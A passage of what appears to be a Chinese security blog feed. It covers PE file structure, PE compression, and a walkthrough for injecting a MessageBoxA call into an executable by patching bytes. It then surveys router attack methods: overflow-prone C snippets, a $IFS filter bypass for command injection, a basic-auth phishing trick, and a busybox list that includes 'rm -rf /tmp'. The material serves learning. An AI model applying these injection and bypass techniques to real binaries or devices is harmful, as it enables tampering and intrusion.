class-name">_IMAGE_FILE_HEADER</span> <span class="token punctuation">&#123;</span>    WORD Machine<span class="token punctuation">;</span>  <span class="token comment">// 目标机器的类型码，如x86或ARM</span>    WORD NumberOfSections<span class="token punctuation">;</span>  <span class="token comment">// 文件中节(section)的数量</span>    DWORD TimeDateStamp<span class="token punctuation">;</span>  <span class="token comment">// 文件创建或最后修改的时间戳</span>    DWORD PointerToSymbolTable<span class="token punctuation">;</span>  <span class="token comment">// 指向文件中符号表的偏移地址</span>    DWORD NumberOfSymbols<span class="token punctuation">;</span>  <span class="token comment">// 符号表中符号条目的数量</span>    WORD SizeOfOptionalHeader<span class="token punctuation">;</span>  <span class="token comment">// 可选头的大小，用于存储扩展的文件信息</span>    WORD Characteristics<span class="token punctuation">;</span>  <span class="token comment">// 文件特性标志，指DLL、应用程序、可执行文件等</span><span class="token punctuation">&#125;</span> IMAGE_FILE_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_FILE_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212182821992.png" class><p>PE 可选头结构体 _IMAGE_OPTIONAL_HEADER 如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span> <span class="token expression"><span class="token number">16</span>  </span><span class="token comment">// 数据目录项数，固定为16</span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_OPTIONAL_HEADER</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 标准域</span>    WORD Magic<span class="token punctuation">;</span>  <span class="token comment">// 可选头类型，0x10表示32位，0x20表示64位</span>    BYTE MajorLinkerVersion<span class="token punctuation">;</span>  <span class="token comment">// 主链接器的版本号，以字节为单位</span>    BYTE MinorLinkerVersion<span class="token punctuation">;</span>  <span class="token comment">// 副链接器的版本号，以字节为单位</span>    DWORD SizeOfCode<span class="token punctuation">;</span>  <span class="token comment">// 代码段大小，以字节为单位</span>    DWORD SizeOfInitializedData<span class="token punctuation">;</span>  <span class="token comment">// 初始化数据段大小，以字节为单位</span>    DWORD SizeOfUninitializedData<span class="token punctuation">;</span>  <span class="token comment">// 未初始化数据段大小，以字节为单位</span>    DWORD AddressOfEntryPoint<span class="token punctuation">;</span>  <span class="token comment">// 程序入口点地址，相对于ImageBase</span>    DWORD BaseOfCode<span class="token punctuation">;</span>  <span class="token comment">// 代码段起始基址RVA</span>    DWORD BaseOfData<span class="token punctuation">;</span>  <span class="token comment">// 数据段起始基址RVA</span>    <span class="token comment">// NT附加域</span>    DWORD ImageBase<span class="token punctuation">;</span>  <span class="token comment">// 镜像基址，即加载到内存的起始地址</span>    DWORD SectionAlignment<span class="token punctuation">;</span>  <span class="token comment">// 节在内存中的对齐大小，以字节为单位</span>    DWORD FileAlignment<span class="token punctuation">;</span>  <span class="token comment">// 节在文件中的对齐大小，以字节为单位</span>    WORD MajorOperatingSystemVersion<span class="token punctuation">;</span>  <span class="token comment">// 主操作系统版本号</span>    WORD MinorOperatingSystemVersion<span class="token punctuation">;</span>  <span class="token comment">// 副操作系统版本号</span>    WORD MajorImageVersion<span class="token punctuation">;</span>  <span class="token comment">// 主镜像版本号</span>    WORD MinorImageVersion<span class="token punctuation">;</span>  <span class="token comment">// 副镜像版本号</span>    WORD MajorSubsystemVersion<span class="token punctuation">;</span>  <span class="token comment">// 主子系统版本号</span>    WORD MinorSubsystemVersion<span class="token punctuation">;</span>  <span class="token comment">// 副子系统版本号</span>    DWORD Win32VersionValue<span class="token punctuation">;</span>  <span class="token comment">// Win32版本值，通常为0</span>    DWORD SizeOfImage<span class="token punctuation">;</span>  <span class="token comment">// 镜像在内存中的大小，以字节为单位</span>    DWORD SizeOfHeaders<span class="token punctuation">;</span>  <span class="token comment">// PE头物理大小，以字节为单位</span>    DWORD CheckSum<span class="token punctuation">;</span>  <span class="token comment">// 校验和，用于验证镜像的完整性</span>    WORD Subsystem<span class="token punctuation">;</span>   <span class="token comment">// 子系统类型</span>    WORD DllCharacteristics<span class="token punctuation">;</span>  <span class="token comment">// DLL特性标志，指示文件是DLL、应用程序等</span>    DWORD SizeOfStackReserve<span class="token punctuation">;</span>  <span class="token comment">// 运行时为每个线程栈保留的内存大小</span>    DWORD SizeOfStackCommit<span class="token punctuation">;</span>  <span class="token comment">// 运行时每个线程栈初始占用的内存大小</span>    DWORD SizeOfHeapReserve<span class="token punctuation">;</span>  <span class="token comment">// 运行时为进程堆保留的内存大小</span>    DWORD SizeOfHeapCommit<span class="token punctuation">;</span>  <span class="token comment">// 运行时进程堆初始占用的内存大小</span>    DWORD LoaderFlags<span class="token punctuation">;</span>  <span class="token comment">// 载入器标志，通常为0</span>    DWORD NumberOfRvaAndSizes<span class="token punctuation">;</span>  <span class="token comment">// 数据目录的项数，固定为IMAGE_NUMBEROF_DIRECTORY_ENTRIES的值</span>    IMAGE_DATA_DIRECTORY DataDirectory<span class="token punctuation">[</span>IMAGE_NUMBEROF_DIRECTORY_ENTRIES<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 数据目录数组</span><span class="token punctuation">&#125;</span> IMAGE_OPTIONAL_HEADER32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_OPTIONAL_HEADER32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212183412327.png" class><h4 id="节表区"><a href="#节表区" class="headerlink" title="节表区"></a>节表区</h4><p>描述 PE 文件各个节的布局和属性，位于 NT 头之后，由一系列 IMAGE_SECTION_HEADER 结构（0x28）构成，每个结构描述一个节，结构排序顺序和描述的节在文件中排序顺序一致。最后以一个空结构结束，所以节表中结构数量为节数量加一</p><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212184742788.png" class><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212185054943.png" class><h3 id="其余特定区域"><a href="#其余特定区域" class="headerlink" title="其余特定区域"></a>其余特定区域</h3><p>text 节、data 节、rsrc 节、数据目录表、导入表、导出表、资源表、重定位表、自定义部分、tls表（线程局部存储表）、加载配置表等</p><p>.relocation 节前 8 字节记录节的 RVA 和<strong>需要进行重定位或修改的条目数量</strong>，每一项都记录了哪些 RVA 地址下的<strong>硬编码寻址</strong>在加载进内存时是需要进行重定位的</p><p>RVA： PE文件的相对虚拟地址（Relative Virual Address）是<strong>PE文件中的数据、模块等运行在内存中的实际地址相对PE文件装载到内存的基址之间的距离</strong></p><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212185413912.png" class><h3 id="导入表-导出表"><a href="#导入表-导出表" class="headerlink" title="导入表 导出表"></a>导入表 导出表</h3><p><strong>导入表</strong>：存在多个导入表记录每个模块，记录自身使用到的其他模块导出的函数，用于确定调用了哪些模块（dll）的哪些函数，以及确定模块加载进内存后具体函数的地址</p><p>导入表结构体（0x14）如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_IMPORT_DESCRIPTOR</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>        DWORD   Characteristics<span class="token punctuation">;</span>            <span class="token comment">// 0 for terminating null import descriptor</span>        DWORD   OriginalFirstThunk<span class="token punctuation">;</span>         <span class="token comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA) 指向IAT结构</span>    <span class="token punctuation">&#125;</span> DUMMYUNIONNAME<span class="token punctuation">;</span>    DWORD   TimeDateStamp<span class="token punctuation">;</span>                  <span class="token comment">// 时间戳.</span>    DWORD   ForwarderChain<span class="token punctuation">;</span>                 <span class="token comment">// -1 if no forwarders</span>    DWORD   Name<span class="token punctuation">;</span>　　　　　　　　　　　　　　　<span class="token comment">//指向 DLL 名字的 RVA 地址</span>    DWORD   FirstThunk<span class="token punctuation">;</span>                     <span class="token comment">// RVA to IAT (if bound this IAT has actual addresses)</span><span class="token punctuation">&#125;</span> IMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span><span class="token keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED <span class="token operator">*</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212185413912.png" class> <img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212190805641.png" class><p>结构体成员：</p><ul><li><p>DUMMYUNIONNAME</p><p>用于确定依赖函数的名称，指向 INT （导入名称表）</p></li><li><p>FirstThunk</p><p>指向 IAT 导入地址表，类似 got 表</p><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/20241208020159-5afedf60-b4c5-1.png" class></li><li><p>Name</p><p>记录一个 RVA 地址，指向依赖的模块的名字</p></li></ul><p><strong>导出表</strong>：只有一个，有子表记录导出符号的地址、名称、序号，需要提供功能的二进制程序（dll）才会有导出表</p><p>包含信息：</p><ul><li>动态链接库提供了什么功能</li><li>向调用者提供输出函数（供使用者调用的函数）在模块中的起始地址</li></ul><p><strong>利用</strong>：通过 dll 名和 dll 导出函数名得到函数地址，也可以通过代码获取：</p><ol><li>通过 Loadlibrary(GetModelHandle) 将 dll 模块映射进内存并返回一个可以被 GetProcAddress 函数使用的句柄</li><li>利用 GetProcAddress 函数获得 dll 的加载地址，然后遍历导出表就可以得到函数地址</li></ol><p>判断导出函数是以序号导出还是以名称导出：</p><p>遍历序号表，判断地址表的下标有没有存在与序号表中，存在就说明是以名称导出，不存在就说明是以序号导出</p><h2 id="PE文件压缩实操总结"><a href="#PE文件压缩实操总结" class="headerlink" title="PE文件压缩实操总结"></a>PE文件压缩实操总结</h2><p>（原理见链接博客</p><p>原程序基址 400000， text 段偏移 1000，rdata 段偏移 2000， data 段偏移 3000</p><h3 id="删除部分"><a href="#删除部分" class="headerlink" title="删除部分"></a>删除部分</h3><p>DOS头从头到 e_lfanew（AddressOfNewExeHeader） 保留其余删除， nt 头到 text 段、text 段到 rdata 段之间多余 \x00 删除，rdata 段末尾保留 4 * \x00 截断字符串，截断字符串到 data 段多余的 \x00 删除</p><p>（删除 nt 头到 text 段的全部 \x00 会报WARNING Line 84: 空结构 和 ERROR Line 1367: 声明中的数组大小无效 的错误但是能运行，不过建议最后熟悉了再删不然影响 010 的 exe模板识别后面节表）</p><h3 id="修改部分"><a href="#修改部分" class="headerlink" title="修改部分"></a>修改部分</h3><p>DosHeader 中 e_lfanew（AddressOfNewExeHeader） 指向 010 中 pe地址</p><p>NtHeader 中的 OptionalHeader：</p><p>​AddressOfEntryPoint 指向 010 中 text 段地址</p><p>​SectionAlignment 、 FileAlignment 改成 4（最小对齐长度）</p><p>​SectionHeaders 中每个节 VirtualAddress 、PointerToRawData 改成 010 中该节地址，SizeOfRawData 改成该节大小</p><h3 id="按偏移修改部分"><a href="#按偏移修改部分" class="headerlink" title="按偏移修改部分"></a>按偏移修改部分</h3><p>NtHeader -&gt; OptionalHeader -&gt; DataDirArray 中的 Import 和 ImportAddressTable</p><p>text 段、rdata 段、data 段中涉及地址的地方（形如402000 &#x2F; 2000的绝对地址或相对地址，具体看原程序在 ida 中哪里是地址）根据 SectionHeaders 中的地址得到偏移再计算修改后的地址</p><p>例如： Import 原值是 2010，所以属于 rdata 段，基址 2000，偏移 10，rdata 段修改后基址 1f0， 所以 Import 需要修改成 1f0 + 10，注意不要算错</p><h2 id="PE文件注入"><a href="#PE文件注入" class="headerlink" title="PE文件注入"></a>PE文件注入</h2><p>*改之前记得先备份一份</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>弹出窗口用到了<code>MessageBoxA</code>函数，用法如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __stdcall <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该函数的二参是弹窗内容，三参是弹窗标题，本文最终目标就是构造出：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token string">"You are injected!"</span><span class="token punctuation">,</span> <span class="token string">"PE injected"</span><span class="token punctuation">,</span> <span class="token number">0x1040u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>弹出标题为 PE injected 内容为 You are injected！，所以总体思路就是先写入标题和内容的字符串，再将参数传递给对应寄存器，最后调用 MessageBoxA 函数</p><h3 id="写入字符串"><a href="#写入字符串" class="headerlink" title="写入字符串"></a>写入字符串</h3><p>向 rdata 段末尾写入 PE injected 和 You are injected!，这里直接用 ida 修改可能会无法保存，需要用 010 editor 写入字符串：先在 ida 中找到 rdata 末尾位置，在 010 editor 中直接搜索字符串 InitializeSListHead 定位到 rdata 段末尾，在后面添加 PE injected 和 You are injected!，再用 ida 打开就能在 rdata 段末尾看到写入的字符串</p><h3 id="确定字符串偏移"><a href="#确定字符串偏移" class="headerlink" title="确定字符串偏移"></a>确定字符串偏移</h3><p>由于程序开了地址随机化，所以不能直接根据地址获取字符串的位置，这里可以参考原程序中字符串是如何获取地址的，例如 19 行的 xmmword_140005820 就是 rdata 段的一个变量</p><p>程序中获取地址的相关代码：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movdqa xmm0, cs:xmmword_140005820<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接看<code>movdqa  xmm0, cs:xmmword_140005820</code>对应的字节码是<code>66 0F 6F 05 DE 40 00 00</code>，反编译结果如下，也就是使用 rip 加偏移获取的相对地址</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movdqa xmm0, xmmword ptr [rip+0x40de]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而这里的 xmmword_140005820 在 ida 中的地址是 0x140005820，上面 010 editor 写入的字符串地址是 0x140006D00，但是由于指令位置不同，同一个变量对应于 rip 的偏移也不同，所以需要结合指令地址去计算字符串的地址，或者直接填一个 rdata 段的地址再根据得到的位置多减少补</p><h3 id="添加-MessageBoxA-函数"><a href="#添加-MessageBoxA-函数" class="headerlink" title="添加 MessageBoxA 函数"></a>添加 MessageBoxA 函数</h3><p>程序中原本是没有 MessageBoxA 函数的，但是在 idata 段有 MessageBoxA 外部函数，所以不能直接通过<code>call MessageBoxA</code>去调用这个函数，需要手动添加<code>MessageBoxA</code>函数，添加内容可以参考<code>exit</code>函数，函数的功能是跳转到 idata 段的对应函数</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jmp cs:__imp_exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应字节码：<code>FF 25 C8 0D 00 00</code>，同样也是通过 rip 进行相对寻址</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jmp qword ptr [rip + 0xdc8]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以添加 MessageBoxA 函数的方式也类似，需要向 text 段末尾添加跳转函数，这里和添加字符串一样，直接用 ida 添加可能会保存失败，需要先用 010 editor写入一段跳转代码的字节码，添加完成后再用 ida 修改是可以正常保存的，所以偏移不确定可以先随机添加一个地址（参考其他函数中使用的地址确保添加的地址位于 idata 段的范围方便后续计算调试），再用 ida 根据添加的函数地址和 MessageBoxA 的相对位置用 Change Byte 去调整具体地址即可</p><p>最终构造如下函数：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jmp cs:__imp_MessageBoxA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以直接<code>call MessageBoxA</code>调用该函数</p><h3 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h3><p>将代码写到开栈操作<code>sub     rsp, 0E0h</code>的后面，否则会堆栈不平衡</p><ul><li><p>将汇编翻译成字节码，这里字符串的相对地址是根据上述方式大致确定的地址，将字节码通过 Change Byte 修改(用 ida 的 assembly 修改会报 Invalid operand</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov     r9, 1040hlea     r8, [rip + 0x5662]lea     rdx, [rip + 0x5663]mov     rcx, 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得到字节码：<code>49 c7 c1 40 10 00 00 4c 8d 05 62 56 00 00 48 8d 15 63 56 00 00 48 c7 c1 00 00 00 00 </code></p></li><li><p>根据得到的字符串位置和实际写入的字符串位置在 ida 中使用 Change Byte 对地址进行微调直到找到正确地址</p></li><li><p>在添加的汇编代码最后使用 ida 的 assemble 添加<code>call MessageBoxA</code></p></li><li><p>按 tab 确认反编译结果是不是<code>MessageBoxA(0LL, &quot;You are injected!&quot;, &quot;PE injected&quot;, 0x1040u);</code></p></li></ul><h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241218212918944.png" class><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>还是我ve1宝哒Ovo</p><p><a href="https://xz.aliyun.com/t/16622">https://xz.aliyun.com/t/16622</a></p><p><a href="https://xz.aliyun.com/t/16622">https://xz.aliyun.com/t/16622</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;PE文件结构&quot;&gt;&lt;a href=&quot;#PE文件结构&quot; class=&quot;headerlink&quot; title=&quot;PE文件结构&quot;&gt;&lt;/a&gt;PE文件结构&lt;/h2&gt;&lt;p&gt;PE : Portable Executable 可移植的可执行文件，Window</summary>
      
    
    
    
    <category term="PE" scheme="https://starrysky1004.github.io/categories/PE/"/>
    
    
    <category term="PE" scheme="https://starrysky1004.github.io/tags/PE/"/>
    
  </entry>
  
  <entry>
    <title>IoT基础知识</title>
    <link href="https://starrysky1004.github.io/2024/12/17/iot-ji-chu-zhi-shi/iot-ji-chu-zhi-shi/"/>
    <id>https://starrysky1004.github.io/2024/12/17/iot-ji-chu-zhi-shi/iot-ji-chu-zhi-shi/</id>
    <published>2024-12-16T16:29:34.000Z</published>
    <updated>2024-12-16T16:35:06.265Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><h3 id="路由的漏洞利用"><a href="#路由的漏洞利用" class="headerlink" title="路由的漏洞利用"></a>路由的漏洞利用</h3><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><ol><li><p><strong>密码破解</strong></p><p>默认密码、弱口令、字典爆破、侧信道（利用服务器响应时间、返回数据包特征，侧信道爆破密码或<code>PIN</code>码）</p></li><li><p><strong>web漏洞</strong></p><p>访问<code>web</code>管理服务与<code>web</code>界面交互，进行渗透（<code>sql</code>注入、<code>rce</code>、<code>csrf</code>、<code>xss</code>）</p></li><li><p><strong>后门</strong></p></li><li><p><strong>缓冲区溢出</strong></p><p>危险函数：<code>strcpy</code>、<code>sprintf</code>、<code>snprintf</code>、<code>strchr</code>、<code>gets</code>，<code>fgetc</code></p><ul><li><p><code>sprintf</code>：<code>sprintf(format,arg1,arg2,arg++)</code>格式化中有<code>%s</code>且没有判断输入长度可能造成栈溢出</p></li><li><p><code>snprintf</code>：返回值是输入长度不是输出长度</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//http1长度大于stack时left也大于stack，snprintf的size为unsigned类型，http2可输入size为负数转成的超大正数</span><span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token function">snprintf</span><span class="token punctuation">(</span>stack<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buf_from_http1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">snprintf</span><span class="token punctuation">(</span>stack<span class="token operator">+</span>left<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token operator">-</span>left<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> buf_from_http2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>strchr</code>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//复制长度由？前字符串长度决定，例如index.phpaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa?a=1</span><span class="token keyword">char</span> <span class="token operator">*</span>query <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token char">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>stack<span class="token punctuation">,</span> url<span class="token punctuation">,</span> quey <span class="token operator">-</span> url <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>fgetc</code>：读取单个字符，一般会循环输入，注意循环边界是否会越界</p></li></ul></li><li><p><strong>逻辑漏洞</strong></p><p>对多个功能点组合利用，挖掘攻击链</p></li><li><p><strong>注入类</strong></p><p>敏感函数：<code>system</code>、<code>popen</code>、<code>exec</code>、<code>execve</code></p><p>过滤关键词：例如<code>$IFS</code>绕过空格，<code>xxd</code>、<code>base64</code>编码</p></li></ol><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p><a href="https://github.com/giantbranch/mipsAudit">https://github.com/giantbranch/mipsAudit</a></p><p><code>mips</code>静态汇编审计辅助脚本，通过回溯敏感函数审计危险函数</p><p>在<code>IDA-&gt;file-&gt;Script FIle</code>中加载即可使用，加载完成会在控制台输出相应信息，点击跳转，对应位置被高亮显示</p><h3 id="mips-linux"><a href="#mips-linux" class="headerlink" title="mips linux"></a>mips linux</h3><p><code>mips linux</code>：使用<code>mips</code>指令架构的<code>linux</code>系统称为<code>mips linux</code>，广泛应用于嵌入式系统。路由器一般使用<code>mips32</code>和<code>arm</code>指令架构</p><p><code>risc</code>架构：精简指令集，包含<code>mips</code>、<code>arm</code>、<code>risc-v</code></p><h3 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p><code>busybox</code>：一个精简终端，路由器的<code>shell</code>是经过裁剪的<code>busybox</code>，<code>shell</code>命令本质是指向<code>busybox</code>的符号链接</p><h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ busybox <span class="token parameter variable">--help</span>        <span class="token comment"># 查看当前路由器的BusyBox支持的命令</span>$ <span class="token function">uname</span> <span class="token parameter variable">-r</span>              <span class="token comment"># 打印系统信息 + 显示当前运行的Linux内核版本(-r)</span>$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>                <span class="token comment"># 查看当前目录下包含隐藏文件的所有文件(-a) + 文件的详细内容(-l)</span>$ <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /tmp           <span class="token comment"># 强制删除/tmp目录 + 目录下的所有文件(-r) + 无需确认(-f)</span>$ <span class="token function">cp</span> <span class="token parameter variable">-R</span> /tmp ./now      <span class="token comment"># 将/tmp目录复制到./now下</span>$ <span class="token function">du</span> <span class="token parameter variable">-sk</span> fireware.bin   <span class="token comment"># 以KB为单位(-sk)查看bin文件大小</span>$ <span class="token function">ps</span> <span class="token parameter variable">-ef</span>                <span class="token comment"># 查看当前系统正在运行的所有进程 + PID PPID(-f)</span>$ <span class="token function">kill</span> <span class="token parameter variable">-9</span> pid           <span class="token comment"># 强制(-9)终止进程号为pid的进程</span>$ <span class="token function">killall</span> <span class="token parameter variable">-9</span> xxx        <span class="token comment"># 强制(-9)终止进程名为xxx的进程</span>$ <span class="token function">ifconfig</span> <span class="token parameter variable">-a</span>           <span class="token comment"># 查看所有网卡的信息(-a)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><strong>CRLF:</strong> 表示回车和换行，在<code>C</code>语言中表达为 <code>\r\n</code>，对应的十六进制数是<code>0A0D</code>，<code>http</code>请求中所有换行都要用<code>\r\n</code>，因为<code>win</code>的回车相当于<code>linux</code>的回车加换行</p><p>**URI:**统一资源标识符，包含协议、主机名、端口号、路径、查询字符串、片段标识符（以<code>#</code>开始指向资源内部特定部分），例如：<code>https://www.example.com/path/to/resource?query=param#fragment</code></p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><table><thead><tr><th>路径</th><th>作用</th></tr></thead><tbody><tr><td>&#x2F;bin  &#x2F;sbin  &#x2F;usr&#x2F;bin  &#x2F;usr&#x2F;sbin</td><td>存放路由器中的应用程序</td></tr><tr><td>&#x2F;lib  &#x2F;usr&#x2F;lib</td><td>存放程序运行时需要的动态库文件</td></tr><tr><td>&#x2F;etc</td><td>存放配置文件（程序自启动配置文件、脚本文件、服务程序配置文件）</td></tr></tbody></table><h3 id="修复路由器的运行环境"><a href="#修复路由器的运行环境" class="headerlink" title="修复路由器的运行环境"></a>修复路由器的运行环境</h3><p>拿到路由器固件首先需要将路由的环境模拟起来，但是由于缺少硬件在固件运行过程中容易缺失工作模块导致仿真和动调失败</p><p>修复路由器程序的大致执行流程：</p><ul><li>运行程序定位导致程序异常的函数</li><li>分析异常函数，编写具有相同功能的函数，在函数中伪造执行流程和数据，并将编写的函数封装成新的动态库</li><li>使用<code>LD_PRELOAD</code>环境变量加载新的动态库来劫持目标程序中的异常函数，使目标程序执行动态库中的函数</li></ul><h2 id="路由器漏洞原理与利用"><a href="#路由器漏洞原理与利用" class="headerlink" title="路由器漏洞原理与利用"></a>路由器漏洞原理与利用</h2><h3 id="路由器web漏洞"><a href="#路由器web漏洞" class="headerlink" title="路由器web漏洞"></a>路由器web漏洞</h3><ul><li><p>xss</p></li><li><p>csrf</p></li><li><p>路由器基础认证漏洞</p><p><a href="http://admin:admin@192.168.0.1以这种形式可以不需要输入用户名和密码就能完成路由器的直接认证和跳转/">http://admin:admin@192.168.0.1以这种形式可以不需要输入用户名和密码就能完成路由器的直接认证和跳转</a></p><p>通过基础认证可以构造出可跨站的方法，例如让用户点击超链接（钓鱼）、让浏览器自动请求资源，允许攻击者利用一个网站的漏洞影响另一个网站，可以搭配xss和csrf</p><p>xss和csrf是基于登陆状态，路由器基础认证漏洞可以变成登陆状态</p></li></ul><h3 id="路由器后门漏洞"><a href="#路由器后门漏洞" class="headerlink" title="路由器后门漏洞"></a>路由器后门漏洞</h3><p>将可以绕过安全控制而获取路由器访问权的漏洞统一称为路由器后门漏洞</p><p>复现文章：</p><ol><li><a href="https://www.freebuf.com/news/others/266860.html">《揭秘家用路由器0day漏洞挖掘技术》磊科全系列路由器后门漏洞分析</a>、<a href="https://www.anquanke.com/post/id/246510#h2-0">磊科全系列路由器后门漏洞分析</a></li><li><a href="https://cloud.tencent.com/developer/article/1035383">32764端口后门重出江湖，影响多款路由器</a>、<a href="https://github.com/elvanderb/TCP-32764">elvanderb&#x2F;TCP-32764</a></li></ol><h3 id="路由器溢出漏洞"><a href="#路由器溢出漏洞" class="headerlink" title="路由器溢出漏洞"></a>路由器溢出漏洞</h3><p>mips32的函数调用和栈布局不同于x86</p><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><p>没有rbp，进入函数时栈顶指针上抬（减）N字节开辟栈帧，函数返回时重新加上N恢复现场。由于不能随意移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量</p><p>函数调用前，caller 函数会在自己的栈顶预留一部分空间来保存 callee 函数的参数；返回地址会直接存入 $RA 寄存器</p><p>函数调用时，前4个参数通过 <em>a</em>0-a3 传递，参数超过4个会被放入调用参数空间</p><h4 id="栈布局"><a href="#栈布局" class="headerlink" 